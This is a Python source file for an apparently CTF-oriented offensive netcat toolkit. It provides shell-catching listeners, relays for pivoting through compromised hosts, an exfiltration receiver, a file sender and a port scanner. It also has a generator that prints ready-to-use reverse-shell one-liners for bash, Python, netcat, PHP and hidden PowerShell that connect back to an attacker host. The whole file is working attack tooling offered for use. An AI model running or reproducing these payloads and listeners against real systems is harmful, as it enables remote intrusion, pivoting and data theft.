#!/usr/bin/env python3
"""
StrategicKhaos Netcat Proxy Module
==================================
Sovereign proxy using netcat for CTF operations

Capabilities:
- Reverse shell listeners
- Port relays/forwarding
- Data exfiltration receivers
- Simple chat/file transfer

Author: Dom (Me10101) - Strategickhaos DAO LLC
"""

import subprocess
import threading
import socket
import os
import tempfile
import shlex
import re
from typing import Callable, Optional
from dataclasses import dataclass
from datetime import datetime


@dataclass
class Listener:
    """Active listener information"""
    port: int
    process: subprocess.Popen
    started_at: datetime
    purpose: str
    output_file: Optional[str] = None


class NetcatProxy:
    """
    Sovereign Netcat-based proxy for CTF operations
    
    Features:
    - Multiple concurrent listeners
    - Relay chains (pivot through hosts)
    - Exfiltration receivers with logging
    - Connection status monitoring
    """
    
    def __init__(self, base_port: int = 4444, log_dir: str = "/tmp/nc_logs"):
        self.base_port = base_port
        self.log_dir = log_dir
        self.listeners: dict[int, Listener] = {}
        self.relays: dict[int, subprocess.Popen] = {}
        
        # Ensure log directory exists
        os.makedirs(log_dir, exist_ok=True)
    
    @staticmethod
    def _validate_port(port: int) -> int:
        """Validate port number is in valid range"""
        if not isinstance(port, int) or port < 1 or port > 65535:
            raise ValueError(f"Invalid port number: {port}")
        return port
    
    @staticmethod
    def _validate_hostname(hostname: str) -> str:
        """Validate hostname/IP address format"""
        # Allow alphanumeric, dots, dashes, and underscores for hostnames
        if not re.match(r'^[a-zA-Z0-9._-]+$', hostname):
            raise ValueError(f"Invalid hostname format: {hostname}")
        return hostname
    
    @staticmethod
    def _validate_filepath(filepath: str) -> str:
        """Validate filepath doesn't contain dangerous characters"""
        # Resolve to absolute path and check it doesn't escape
        abs_path = os.path.abspath(filepath)
        # Basic check - path should not try to escape using ..
        if '..' in filepath or not os.path.exists(os.path.dirname(abs_path)):
            raise ValueError(f"Invalid or unsafe file path: {filepath}")
        return abs_path
    
    def start_listener(
        self, 
        port: int, 
        callback: Optional[Callable[[str], None]] = None,
        purpose: str = "general"
    ) -> Listener:
        """
        Start a netcat listener on specified port
        
        Args:
            port: Port to listen on
            callback: Optional function to call with each line of output
            purpose: Description of what this listener is for
        
        Returns:
            Listener object with process handle
        """
        port = self._validate_port(port)
        
        if port in self.listeners:
            raise ValueError(f"Port {port} already has an active listener")
        
        log_file = os.path.join(self.log_dir, f"listener_{port}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
        
        # Start netcat listener with validated port
        proc = subprocess.Popen(
            ['nc', '-lvnp', str(port)],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.PIPE,
            bufsize=1,
            universal_newlines=True
        )
        
        listener = Listener(
            port=port,
            process=proc,
            started_at=datetime.now(),
            purpose=purpose,
            output_file=log_file
        )
        self.listeners[port] = listener
        
        # Start output reader thread
        def read_output():
            with open(log_file, 'w') as f:
                for line in proc.stdout:
                    f.write(line)
                    f.flush()
                    if callback:
                        callback(line.strip())
        
        thread = threading.Thread(target=read_output, daemon=True)
        thread.start()
        
        print(f"[+] Listener started on port {port} ({purpose})")
        print(f"    Logging to: {log_file}")
        
        return listener
    
    def stop_listener(self, port: int) -> bool:
        """Stop a listener on specified port"""
        if port not in self.listeners:
            return False
        
        listener = self.listeners[port]
        listener.process.terminate()
        try:
            listener.process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            listener.process.kill()
        
        del self.listeners[port]
        print(f"[-] Listener stopped on port {port}")
        return True
    
    def create_relay(
        self, 
        local_port: int, 
        target_host: str, 
        target_port: int
    ) -> int:
        """
        Create a relay: local_port → target_host:target_port
        
        Useful for pivoting through compromised hosts
        """
        # Validate inputs
        local_port = self._validate_port(local_port)
        target_port = self._validate_port(target_port)
        target_host = self._validate_hostname(target_host)
        
        # Create named pipe for bidirectional relay with validated port
        pipe_path = f"/tmp/relay_{local_port}"
        
        # Clean up existing pipe
        if os.path.exists(pipe_path):
            os.remove(pipe_path)
        
        # Create relay using socat (more reliable than nc for relays)
        # Fall back to nc-based relay if socat not available
        try:
            # Use validated parameters directly (not in shell)
            proc = subprocess.Popen(
                ['socat', f'TCP-LISTEN:{local_port},fork', f'TCP:{target_host}:{target_port}'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.relays[local_port] = proc
            print(f"[+] Relay created: localhost:{local_port} → {target_host}:{target_port} (socat)")
        except FileNotFoundError:
            # Fallback to nc-based relay with proper argument handling
            cmd = f'mkfifo {shlex.quote(pipe_path)} 2>/dev/null; nc -lvnp {local_port} < {shlex.quote(pipe_path)} | nc {shlex.quote(target_host)} {target_port} > {shlex.quote(pipe_path)}'
            proc = subprocess.Popen(['bash', '-c', cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.relays[local_port] = proc
            print(f"[+] Relay created: localhost:{local_port} → {target_host}:{target_port} (nc)")
        
        return local_port
    
    def stop_relay(self, local_port: int) -> bool:
        """Stop a relay"""
        if local_port not in self.relays:
            return False
        
        self.relays[local_port].terminate()
        del self.relays[local_port]
        
        # Clean up pipe
        pipe_path = f"/tmp/relay_{local_port}"
        if os.path.exists(pipe_path):
            os.remove(pipe_path)
        
        print(f"[-] Relay stopped on port {local_port}")
        return True
    
    def exfil_receiver(self, port: int, output_file: str) -> Listener:
        """
        Start a receiver for exfiltrated data
        
        Data sent to this port will be saved to output_file
        """
        port = self._validate_port(port)
        output_file = self._validate_filepath(output_file)
        
        # Use nc to receive and save directly
        with open(output_file, 'wb') as f:
            pass  # Create empty file
        
        # Use properly quoted filename to prevent command injection
        cmd = f'nc -lvnp {port} >> {shlex.quote(output_file)}'
        proc = subprocess.Popen(
            ['bash', '-c', cmd],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        listener = Listener(
            port=port,
            process=proc,
            started_at=datetime.now(),
            purpose="exfil_receiver",
            output_file=output_file
        )
        self.listeners[port] = listener
        
        print(f"[+] Exfil receiver started on port {port}")
        print(f"    Saving to: {output_file}")
        
        return listener
    
    def file_sender(self, target_host: str, target_port: int, file_path: str) -> bool:
        """
        Send a file to a remote listener
        """
        target_host = self._validate_hostname(target_host)
        target_port = self._validate_port(target_port)
        file_path = self._validate_filepath(file_path)
        
        if not os.path.exists(file_path):
            print(f"[ERROR] File not found: {file_path}")
            return False
        
        try:
            # Use properly quoted arguments to prevent command injection
            cmd = f'nc {shlex.quote(target_host)} {target_port} < {shlex.quote(file_path)}'
            result = subprocess.run(
                ['bash', '-c', cmd],
                timeout=60,
                capture_output=True
            )
            print(f"[+] File sent: {file_path} → {target_host}:{target_port}")
            return True
        except subprocess.TimeoutExpired:
            print(f"[ERROR] Timeout sending file")
            return False
    
    def port_scan(self, target: str, port_range: str = "1-1000") -> list[int]:
        """
        Quick port scan using netcat
        (Poor man's nmap - use for quick checks only)
        """
        target = self._validate_hostname(target)
        
        # Validate port_range format
        if '-' not in port_range:
            raise ValueError("Port range must be in format 'start-end'")
        
        try:
            start, end = map(int, port_range.split('-'))
            start = self._validate_port(start)
            end = self._validate_port(end)
        except (ValueError, TypeError) as e:
            raise ValueError(f"Invalid port range format: {port_range}") from e
        
        open_ports = []
        
        print(f"[*] Scanning {target} ports {start}-{end}...")
        
        for port in range(start, end + 1):
            try:
                result = subprocess.run(
                    ['nc', '-zv', '-w', '1', target, str(port)],
                    capture_output=True,
                    timeout=2
                )
                if result.returncode == 0:
                    open_ports.append(port)
                    print(f"    [OPEN] {port}")
            except subprocess.TimeoutExpired:
                pass
        
        return open_ports
    
    def list_active(self) -> dict:
        """List all active listeners and relays"""
        return {
            "listeners": {
                port: {
                    "purpose": l.purpose,
                    "started": l.started_at.isoformat(),
                    "log": l.output_file
                }
                for port, l in self.listeners.items()
            },
            "relays": list(self.relays.keys())
        }
    
    def cleanup(self):
        """Stop all listeners and relays"""
        for port in list(self.listeners.keys()):
            self.stop_listener(port)
        for port in list(self.relays.keys()):
            self.stop_relay(port)
        print("[*] All connections cleaned up")


class ReverseShellGenerator:
    """
    Generate reverse shell payloads for various languages/systems
    """
    
    @staticmethod
    def bash(lhost: str, lport: int) -> str:
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    @staticmethod
    def python(lhost: str, lport: int) -> str:
        return f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' '''
    
    @staticmethod
    def netcat(lhost: str, lport: int) -> str:
        return f"nc -e /bin/bash {lhost} {lport}"
    
    @staticmethod
    def netcat_mkfifo(lhost: str, lport: int) -> str:
        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    
    @staticmethod
    def php(lhost: str, lport: int) -> str:
        return f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' '''
    
    @staticmethod
    def powershell(lhost: str, lport: int) -> str:
        return f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
    
    @classmethod
    def all(cls, lhost: str, lport: int) -> dict:
        """Generate all payload types"""
        return {
            "bash": cls.bash(lhost, lport),
            "python": cls.python(lhost, lport),
            "netcat": cls.netcat(lhost, lport),
            "netcat_mkfifo": cls.netcat_mkfifo(lhost, lport),
            "php": cls.php(lhost, lport),
            "powershell": cls.powershell(lhost, lport)
        }


def interactive_proxy():
    """Interactive CLI for the proxy"""
    print("""
╔══════════════════════════════════════════════════════════════════╗
║           STRATEGICKHAOS NETCAT PROXY v1.0                      ║
║               Sovereign Network Operations                       ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    proxy = NetcatProxy()
    
    while True:
        try:
            cmd = input("nc> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Cleaning up...")
            proxy.cleanup()
            break
        
        if not cmd:
            continue
        
        parts = cmd.split()
        action = parts[0].lower()
        
        try:
            if action in ['exit', 'quit', 'q']:
                proxy.cleanup()
                break
            
            elif action == 'listen' and len(parts) >= 2:
                port = int(parts[1])
                purpose = ' '.join(parts[2:]) if len(parts) > 2 else "shell catcher"
                proxy.start_listener(port, callback=print, purpose=purpose)
            
            elif action == 'stop' and len(parts) >= 2:
                port = int(parts[1])
                proxy.stop_listener(port)
            
            elif action == 'relay' and len(parts) >= 4:
                local_port = int(parts[1])
                target_host = parts[2]
                target_port = int(parts[3])
                proxy.create_relay(local_port, target_host, target_port)
            
            elif action == 'exfil' and len(parts) >= 3:
                port = int(parts[1])
                output_file = parts[2]
                proxy.exfil_receiver(port, output_file)
            
            elif action == 'send' and len(parts) >= 4:
                target_host = parts[1]
                target_port = int(parts[2])
                file_path = parts[3]
                proxy.file_sender(target_host, target_port, file_path)
            
            elif action == 'scan' and len(parts) >= 2:
                target = parts[1]
                port_range = parts[2] if len(parts) > 2 else "1-1000"
                proxy.port_scan(target, port_range)
            
            elif action == 'shells' and len(parts) >= 3:
                lhost = parts[1]
                lport = int(parts[2])
                shells = ReverseShellGenerator.all(lhost, lport)
                print("\n🐚 Reverse Shell Payloads:")
                for name, payload in shells.items():
                    print(f"\n[{name}]")
                    print(payload)
            
            elif action == 'list':
                active = proxy.list_active()
                print(f"\n📡 Active Listeners: {len(active['listeners'])}")
                for port, info in active['listeners'].items():
                    print(f"  :{port} - {info['purpose']}")
                print(f"\n🔀 Active Relays: {active['relays']}")
            
            elif action == 'help':
                print("""
Commands:
  listen <port> [purpose]     - Start listener
  stop <port>                 - Stop listener
  relay <local> <host> <port> - Create relay
  exfil <port> <file>         - Start exfil receiver
  send <host> <port> <file>   - Send file
  scan <target> [range]       - Port scan (default: 1-1000)
  shells <lhost> <lport>      - Generate reverse shells
  list                        - Show active connections
  help                        - Show this help
  exit                        - Exit
                """)
            
            else:
                print("[?] Unknown command. Type 'help' for options.")
        
        except ValueError as e:
            print(f"[ERROR] Invalid input: {e}")
        except Exception as e:
            print(f"[ERROR] Command failed: {e}")


if __name__ == "__main__":
    interactive_proxy()
